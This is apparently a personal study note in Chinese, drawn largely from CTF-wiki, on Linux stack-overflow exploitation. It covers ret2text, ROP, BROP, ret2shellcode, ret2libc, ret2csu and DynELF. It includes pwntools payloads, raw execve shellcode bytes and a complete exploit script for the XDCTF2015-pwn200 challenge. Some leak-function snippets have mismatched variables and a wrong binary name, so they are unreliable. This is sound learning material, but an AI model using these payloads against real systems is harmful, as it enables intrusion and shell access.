![image-20240311205425649](C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20240311205425649.png)



​		**使用可以溢出的函数，对变量进行输入，如果不加限制，那么就可以覆盖返回地址，从而执行system函数，使用的是EIP寄存器**

```bash
gcc -m32 -fno-stack-protector stack_example.c -o stack_example
```

```ABAP
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```

> 历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出

使用IDA可以查看到反编译后的结果

```c
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

那么字符串距离ebp的长度为0x14，那么栈的结构为

```
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

通过IDA获取到succes的地址，其地址为0x0804843B

```
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

如果此时我们输入的字符串为：

```
0x14*'a'+'bbbb'+success_addr
```

那么就会覆盖住ebp和retn，这样就修改了retn的地址，那么此时，输入完后，就会返回到success的函数的地址处，运行success

```
                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

由于一般情况下，采用的是小端存储，也就是，从低位到高位存储，0x0804843B在内存里的形式为：

```
\x3b\x84\x04\x08
```

不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x0804843b
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```

#### 步骤

##### 寻找危险函数 [¶](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_5)



通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下

- 输入

  - gets，直接读取一行，忽略'\x00'
  - scanf
  - vscanf

- 输出

  - sprintf

- 字符串

  - strcpy，字符串复制，遇到'\x00'停止
  - strcat，字符串拼接，遇到'\x00'停止
  - bcopy

  

##### 确定填充长度 [¶](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_6)



这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

- 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得
- 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
- 直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

- **覆盖函数返回地址**，这时候就是直接看 EBP 即可。
- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
- **覆盖 bss 段某个变量的内容**。
- 根据现实执行情况，覆盖特定的变量或地址的内容。

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来**直接或者间接地控制程序执行流程**。

### ROP



​		随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程

这些gadgets通常是一系列指令，以一种连续的方式结束于`ret`指令，使得当函数返回时，控制流可以转移到下一个gadget。通过精心构造这些gadgets的序列，攻击者可以实现对程序的控制。

ROP Gadgets通常具有以下特点：

1. **短小**：每个gadget只包含几条指令，通常是5-10条指令。
2. **以`ret`结束**：每个gadget的结尾都是一个`ret`指令，以便返回到调用者的地址。
3. **存在于可执行内存中**：攻击者可以利用程序本身的代码段、库中的函数、或者其他可执行内存中的代码作为gadgets。

ROP Gadgets的典型用途包括：

- **绕过内存保护**：当程序禁止执行栈上的数据时，攻击者可以利用ROP Gadgets来执行代码，因为这些gadgets是程序本身的一部分，已经被允许执行。
- **执行系统调用**：通过调用程序中的已有函数或库函数，攻击者可以利用ROP Gadgets来执行系统调用，以实现对系统的控制。

要利用ROP Gadgets，攻击者通常需要分析目标程序的二进制代码，识别和组合合适的gadgets序列，构建出一个有效的ROP链。



### JOP/COP

在JOP攻击中，攻击者控制的恶意数据覆盖jmp指令的跳转地址实现控制流劫持，JOP代码段是一串以jmp指令结尾的代码段。而在COP攻击中，攻击者控制的恶意数据覆盖call指令的跳转地址实现控制流劫持，COP代码段是一串以call指令结尾的代码段。对于JOP/COP攻击而言，攻击者要找寻的代码段中，除了要修改目标寄存器外，还要包含一个用于修改后续jmp/call跳转地址的pop指令（在ROP攻击中，由ret指令的特点，不需要攻击者额外控制）。

值得一提的是，在实际应用中，攻击者为了达成劫持控制流的目的，会将三种代码段通过组合的方式发起混合攻击。



### BROP

BROP(Blind ROP)是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。

#### 攻击条件 [¶](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_9)

1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。

#### 基本思路 [¶](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_11)

在 BROP 中，基本的遵循的思路如下

- 判断栈溢出长度
  - 暴力枚举
- Stack Reading
  - 获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。
- Blind ROP
  - 找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。
- Build the exploit
  - 利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。



##### 栈溢出长度

从1直接暴力枚举即可，直到程序崩溃



##### stack reading

这个是stack经典布局

```
buffer|canary|saved fame pointer|saved returned address
```



如果想要获取到canary和后的变量，就需要溢出长度，可以通过尝试试探出

每次的 canary 等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有 256 种可能，所以在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。

![image-20240406172947825](${images}/image-20240406172947825.png)

![image-20240406172956392](${images}/image-20240406172956392.png)



##### Blind ROP

###### 基本思路

执行write方法的时候构造系统调用

```
pop rdi; ret # socket
pop rsi; ret # buffer
pop rdx; ret # length
pop rax; ret # write syscall number
syscall
```



但此时找到syscall的地址很困难，基本不可能，但可以通过寻找write的方式来获取



###### BROP Gadgets

后面会解释一个东西交libc_csu_init结尾的通用gadgets，此时可通过偏移获取write函数调用的前两个参数

![image-20240406173311161](${images}/image-20240406173311161.png)

> 在r14和r15有两个通用的gadgets



###### find a call write

> 通过plt表获取write的地址



###### control rdx

rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可。一般来说程序中的 rdx 经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序

```
pop rdx; ret
```

指令几乎没有。如何控制 rdx 的数值呢？这里需要说明执行 strcmp 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。

那么接下来的问题，我们就可以分为两项

- 寻找 gadgets
- 寻找 PLT 表
  - write 入口
  - strcmp 入口



###### 寻找GADGETS

尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。我们控制程序的返回地址时，一般有以下几种情况

- 程序直接崩溃
- 程序运行一段时间后崩溃
- 程序一直运行而并不崩溃



###### 寻找stop gadgets

`stop gadget`一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态

> stop gadget 也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个 gadgets。

如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了。因此，攻击者就会认为在这个过程中并没有执行到任何的`useful gadget`，从而放弃它。

![image-20240406174812277](${images}/image-20240406174812277.png)

布置了`stop gadget`，那么对于我们所要尝试的每一个地址，如果它是一个 gadget 的话，那么程序不会崩溃。接下来，就是去想办法识别这些 gadget。



###### 识别gadgets

为了更加容易地进行介绍，这里定义栈上的三种地址

- Probe
  - 探针，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。
- Stop
  - 不会使得程序崩溃的 stop gadget 的地址。
- Trap
  - 可以导致程序崩溃的地址



栈上摆放不同顺序的 **Stop** 与 **Trap** 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。



- robe,stop,traps(traps,traps,...)

  - 我们通过程序崩溃与否 (如果程序在 probe 处直接崩溃怎么判断) 可以找到不会对栈进行 pop 操作的 gadget，如
    - ret
    - xor eax,eax; ret

- probe,trap,stop,traps

  - 我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如
    - pop rax; ret
    - pop rdi; ret

- probe, trap, trap, trap, trap, trap, trap, stop, traps

  - 我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。

    这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，

    这里一般来说会遇到两处比较有意思的地方

    - plt 处不会崩，，
    - _start 处不会崩，相当于程序重新执行。

BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。所以，如果我们发现了这样的 gadgets，那么，有很大的可能性，这个 gadgets 就是 brop gadgets。此外，这个 gadgets 通过错位还可以生成 pop rsp 等这样的 gadgets，可以使得程序崩溃也可以作为识别这个 gadgets 的标志。

此外，根据我们之前学的 ret2libc_csu_init 可以知道该地址减去 0x1a 就会得到其上一个 gadgets。可以供我们调用其它函数。

需要注意的是 probe 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.



###### 寻找plt

一般来所，plt表很规整，每个表项都是16字节，并且，在每个表项的6字节偏移处，是表项对应的函数的解析的路径，也就是程序最初执行该函数时的对got地址解析

![image-20240406184722249](${images}/image-20240406184722249.png)

对于大多数plt调用来说，一般不容易崩溃，即使使用了比较奇怪的参数。因此发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表，除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。



###### 控制rdx

找到plt表后，需要控制rdx的数值，因此需要寻找strcmp函数的地址，但并非所有程序都会使用strcmp函数，如若没有strcmp的函数，则需要使用其他方法控制rdx的值了。

在有的情况下：

之前，我们已经找到了 brop 的 gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址

- readable，可读的地址。
- bad, 非法地址，不可访问，比如说 0x0。

那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况

- strcmp(bad,bad)
- strcmp(bad,readable)
- strcmp(readable,bad)
- strcmp(readable,readable)

只有最后一种格式，程序才会正常执行。

> **注**：在没有 PIE 保护的时候，64 位程序的 ELF 文件的 0x400000 处有 7 个非零字节。

比较直接的方法就是从头到尾依次扫描每个 plt 表项，但是这个却比较麻烦，可以选择如下的一种方法

- 利用 plt 表项的慢路径
- 并且利用下一个表项的慢路径的地址来覆盖返回地址

这样，我们就不用来回控制相应的变量了。

当然，我们也可能碰巧找到 strncmp 或者 strcasecmp 函数，它们具有和 strcmp 一样的效果。



###### 寻找输出函数

可以是write，也可以是puts，puts的参数比write少，一般先找puts。先介绍如何寻找write



###### 寻找write@plt

控制 write 函数的三个参数的时候，我们就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值

- 使用 rop chain，同时使得每个 rop 对应的文件描述符不一样
- 同时打开多个连接，并且我们使用相对较高的数值来试一试。

需要注意的是

- linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。
- posix 标准每次申请的文件描述符数值总是当前最小可用数值。

当然，我们也可以选择寻找 puts 函数。



###### 寻找puts@plt

寻找 puts 函数 (这里我们寻找的是 plt)，我们自然需要控制 rdi 参数，在上面，我们已经找到了 brop gadget。那么，我们根据 brop gadget 偏移 9 可以得到相应的 gadgets（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。一般来说，其 payload 如下

```
payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```



###### 攻击总结

此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出. text 段更多的内容以便于来找到更多合适 gadgets。同时，攻击者还可以找到一些其它函数，如 dup2 或者 execve 函数。一般来说，攻击者此时会去做下事情

- 将 socket 输出重定向到输入输出
- 寻找 “/bin/sh” 的地址。一般来说，最好是找到一块可写的内存，利用 write 函数将这个字符串写到相应的地址。
- 执行 execve 获取 shell，获取 execve 不一定在 plt 表中，此时攻击者就需要想办法执行系统调用了。



### ret2text概述

控制程序执行程序本身已有的的代码 (即， `.text` 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护



### ret2reg概述

1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间
2. 然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址
3. reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)



### ret2shellcode概述



​		ret2shellcode是指攻击者需要自己将调用shell的机器码（也称shellcode）注入至内存中，随后利用栈溢出复写return_address，进而使程序跳转至shellcode所在内存。

​		要实现上述目的，就必须在内存中找到一个可写（这允许我们注入shellcode）且可执行（这允许我们执行shellcode）的段，并且需要知道如何修改这些段的内容。不同的程序及操作系统采取的保护措施不尽相同，因此如何注入shellcode也应当灵活选择。

自动化shellcode

```
shellcode = asm(shellcraft.sh())
```

一般shellcode

```
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```



#### 可能的攻击手段

##### 1.向stack段中注入shellcode

​		能向栈中注入shellcode的情况非常少见，这是因为目前的操作系统及程序一般都会开启对栈的保护。比较常见的保护手段有：

- ASLR（Address Space Layout Randmization）：该防御手段在Linux和Windows中都非常常见。其功能是将一部分内存段（如栈等）的地址进行随机偏移，使得攻击者即使成功注入了shellcode也难以定位其位置，进而达到防御的目的；
- The NX（No-eXecute） bits：该防御手段使得部分内存段（如堆、栈等）不可执行，攻击者即使成功注入了shellcode也无法执行其中代码，进而达到防御的目的；
- Canary：该防御手段的原理是在栈底插入cookie信息，函数返回时将检测该信息是否被改变，若被改变则可断定发生了溢出，进而可以立刻终止程序运行。

##### 2.向bss段中注入shellcode

​		在虚拟内存中，bss段主要保存的是没有初值的全局变量或静态变量（在汇编语言中通过占位符？声明）。若某个程序的bss段可写且可执行，攻击者就可以尝试将shellcode注入写入全局变量或静态变量中。

##### 3.向data段中注入shellcode

​		在虚拟内存中，data段主要保存的是已经初始化了的全局变量或静态变量。其攻击思路与向bss段中注入shellcode非常类似。

##### 4.向heap段中注入shellcode

​		heap段主要保存的是通过动态内存分配产生的变量。若某个程序的heap段可写且可执行，攻击者就可以尝试将shellcode注入至动态分配的变量中。



### ret2libc简述

利用程序自带的`system`函数和`/bin/sh`字符串构造`system("/bin/sh")`函数，通过主函数`gets`函数溢出覆盖返回值来返回到`system`函数地址，从而执行上述函数获得最高权限。



#### PLT表和GOT表

在进行ret2libc学习之前，我们需要先了解一下PLT表与GOT表的内容。

##### **Globle offset table（GOT)**

> 全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址

> Procedure linkage table（PLT)过程连接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量
>

简单来说，当程序第一次执行函数A时，流程如下：

在汇编程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新，会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。

![image-20240313184439577](${images}/image-20240313184439577.png)

当程序第二次执行函数A时，流程如下
可以看到此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用

![image-20240313184450263](${images}/image-20240313184450263.png)



#### 64位下通用Gadget学习

##### _libc_csu_init()

此函数，会从**0x40061A**开始执行，将**rbx/rbp/r12/r13/r14/r15**六个寄存器设置号，再**ret**到**0x400600**处，继续布置**rdx/rsi/rdi**，最后通过**call qword ptr[r12+rbx*8]**执行目标函数



![image-20240325103916503](${images}/image-20240325103916503.png)

可以通过函数地址的指针（记录库函数真是地址的got表项）来控制目标函数，也可以控制目标函数的最多三个入参数（rdi/rsi/rdx）的值。只要设置rbp = rbx + 1，且栈空间足够，那么Gadget就能一直循环调用下去。所以这个gadget非常好用



一次调用需要64字节的栈空间

![image-20240325095250314](${images}/image-20240325095250314.png)

栈的布置如上：

##### 隐藏的Gadget：pop rdi，ret

这个比上面那个简单

![image-20240325095847145](${images}/image-20240325095847145.png)

构成的pop rdi,ret。已经足够栈溢出了。

因为栈溢出后需要：

1. 通过类似puts的方式，泄漏libc库函数的地址，从而通过偏移计算出system函数和“/bin/sh”字符串的地址
2. 执行system("/bin/sh")获得shell



很多情况近需要一个入参的函数调用，__libc_csu_inti()函数的最后的pop rdi,ret可以实现

此时，近需要24字节(QWROD存放ret进来的地址，两个QWORD作为入参和被调用的函数地址)的溢出空间即可

此时的栈空间布置如下：
![image-20240325100424083](${images}/image-20240325100424083.png)



##### 隐藏Gadget:pop rsi,...,ret

拆分快捷键D，不知道为什么我没有像他一样直接显示命令

找到解决方法了：

***\*先把两处\**\**undefine\*******\*，然后再\**\**code\*******\*，就变成了两条指令\****

![image-20240325104039841](${images}/image-20240325104039841.png)

![image-20240325105555579](${images}/image-20240325105555579.png)





### ret2csu简述

> 基于x64文件的使用Gadget和got和plt表构造的ROP链
>
> 在x64程序里，函数的前六个参数是通过寄存器传递的，但很多时候，很难找到每一个寄存器对应的Gadgets。这时候需要利用x64下的_libc_csu_init中的gadgets。这个函数使用libc进行初始化操作的，一般的程序都会调用libc函数，所以这个函数一定会存在。
>
> 形式差不多如下：（不同版本有不同的形式）

```
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

> 利用思路：
>
> - 从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。
> - 从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，**但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）**，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。
> - 从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。
>
> 因此
>
> - 利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数
> - 根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址
> - 再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 '/bin/sh’ 地址，并使得程序重新执行 main 函数。
> - 再次利用栈溢出执行 libc_csu_gadgets 执行 execve('/bin/sh') 获取 shell。



#### 借助DynELF实现无libc漏洞利用

> 在没有目标libc文件的情况下，可使用pwntools的DynELF模块泄漏地址信息
>
> 此次针对linux下的puts和write，给出实现DynELF关键函数leak的方法

[【技术分享】借助DynELF实现无libc的漏洞利用小结-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/85129)

##### DynELF

> pwntools中专门实现应对无lib成情况的漏洞利用模块，框架如下：

```python
p = process('./xxx')
#p = remote('IP','PORT')
def leak(address):
	#各种预处理
	payload = "xxx" + address + "xxxx"
	p.send(payload)
	#各种处理
	data = p.recv(4)
	log.debug("%#x  => %s" % (address,(data or '').encode('hex')))
	return data
	
d = DynELF(leak, elf=ELF("./xxx"))
systemAddress = d.lookup('system','libc')
```

> 需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码



###### 使用条件

> 不论有没有libc文件，要获取目标系统的system函数地址，首先都得需要要求目标二进制程序存在能泄漏目标系统内存中libc空间内信息的漏洞。同时，由于因为在对方内存中不断搜索地址信息，则需要信息泄漏漏洞能被反复调用。
>
> 1. 目标程序存在可以泄漏libc空间信息的漏洞，如read@got就指向libc地址空间内；
> 2. 目标程序中存在的信息泄露漏洞能反复触发，从而可以不断泄露libc地址空间内的信息
>
> 接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。



###### write函数

> 在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget
>
> 通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。

第一段代码如下

```
.text:000000000040075A   pop  rbx  #需置为0，为配合第二段代码的call指令寻址
.text:000000000040075B   pop  rbp  #需置为1
.text:000000000040075C   pop  r12  #需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令
.text:000000000040075E   pop  r13  #write函数的第三个参数
.text:0000000000400760   pop  r14  #write函数的第二个参数
.text:0000000000400762   pop  r15  #write函数的第一个参数
.text:0000000000400764   retn
```

第二段代码如下

```
.text:0000000000400740   mov  rdx, r13
.text:0000000000400743   mov  rsi, r14
.text:0000000000400746   mov  edi, r15d
.text:0000000000400749   call  qword ptr [r12+rbx*8]
```

这两段代码运行后，会将栈顶指针移动56字节，在栈中布置56个字节即可



###### puts函数

> 即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。

情况1：puts输出后就没有其他输出，leak：

```
def leak(address):
	count = 0
	data = b''
	paylaod = xxx
	print(p.recvuntil('xxxn'))#必须要在puts前释放完输出
	up = b""
	while True:
	#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了
    #以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””
    c = p.recv(numb = 1, timeout = 1)
    count += 1
    if up == b'\n' and c == b"": #接收的上一字符为回车键，而当前接收不到新字符，
    	buf = buf[:-1]        #则删除puts函数输出的末尾回车符
    	buf += b"\x00"
    	break
    else:
    	buf += c
    	up = c
    data = buf[:4]
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data
```

情况二：puts输出完后还有其他输出，这种情况下的leak函数可以这么写。

```
def leak(address):
  count = 0
  data = b""
  payload = xxx
  p.send(payload)
  print p.recvuntil(b"xxxn")) #一定要在puts前释放完输出
  up = b""
  while True:
    c = p.recv(1)
    count += 1
    if up == b'\n' and c == b"x":  #一定要找到泄漏信息的字符串特征
      data = data[:-1]                     
      data += b"\x00"
      break
    else:
      data += c
      up = c
  data = buf[:4] 
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
```

**其他需要注意的地址**

在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈。



**PS：以下题目，如果需要使用python3，请修改部分代码**

**XDCTF2015-pwn200**



本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下**借助DynELF实现利用的要点：**

 1）调用write函数来泄露地址信息，比较方便；

 2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；

 3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；

 4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。

接下来就直接给出利用代码。

```makefile
from pwn import *
import binascii
p = process("./xdctf-pwn200")
elf = ELF("./xdctf-pwn200")
writeplt = elf.symbols['write']
writegot = elf.got['write']
readplt = elf.symbols['read']
readgot = elf.got['read']
vulnaddress =  0x08048484 
startaddress = 0x080483d0      #调用start函数，用以恢复栈
bssaddress =   0x0804a020    #用来写入“/bin/sh”字符串
def leak(address):
  payload = "A" * 112
  payload += p32(writeplt)
  payload += p32(vulnaddress)
  payload += p32(1)
  payload += p32(address)
  payload += p32(4)
  p.send(payload)
  data = p.recv(4)
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data
print p.recvline()
dynelf = DynELF(leak, elf=ELF("./lctf-pwn200"))
systemAddress = dynelf.lookup("__libc_system", "libc") 
print "systemAddress:", hex(systemAddress)
#调用_start函数，恢复栈
payload1 = "A" * 112
payload1 += p32(startaddress) 
p.send(payload1)
print p.recv()
ppprAddress = 0x0804856c  #获取到的连续3次pop操作的gadget的地址 
payload1 = "A" * 112
payload1 += p32(readplt)
payload1 += p32(ppprAddress)
payload1 += p32(0)
payload1 += p32(bssaddress)
payload1 += p32(8)
payload1 += p32(systemAddress) + p32(vulnaddress) + p32(bssaddress)
p.send(payload1)
p.send('/bin/sh')
p.interactive()
```





**LCTF2016-pwn100**



